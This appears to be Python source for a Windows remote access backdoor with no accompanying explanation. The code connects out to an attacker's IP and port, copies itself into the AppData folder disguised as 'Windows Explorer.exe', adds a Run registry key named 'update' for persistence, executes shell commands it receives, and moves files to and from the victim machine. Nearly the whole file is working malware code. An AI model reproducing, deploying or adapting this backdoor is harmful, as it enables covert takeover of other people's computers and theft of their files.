import socket
import subprocess
import simplejson
import os
import base64
import sys
import shutil

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
            
    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        shutil.copyfile(sys.executable, evil_file_location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)


    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    def reliable_send(self, data):
        json_data = simplejson.dumps(data)
        self.connection.send(json_data.encode())

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload Successful"      
    
    def change_directory(self, path):
        os.chdir(path) 
        return "[!] Changing Current Working Directory to {}".format(path)
    def reliable_recv(self):
        json_data = b" "
        while True:
            try: 
                json_data = json_data + self.connection.recv(1024)
                return simplejson.loads(json_data)    
            except ValueError:
                continue

    def reciever(self):
        while True:
            recieved_command = self.reliable_recv()
            try: 
                if recieved_command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif recieved_command[0] == "cd" and len(recieved_command) > 1:
                    command_result = self.change_directory(recieved_command[1])
                elif recieved_command[0] == "download" and len(recieved_command)  > 1:
                    command_result = self.read_file(recieved_command[1])
                elif recieved_command[0] == "upload":
                    command_result = self.write_file(recieved_command[1], recieved_command[2])
                else:
                    command_result = self.execute_system_command(recieved_command)
            except Exception:
                command_Result = "[-] Error!!! in Command Execution..."

            self.reliable_send(command_result)
        self.connection.close()


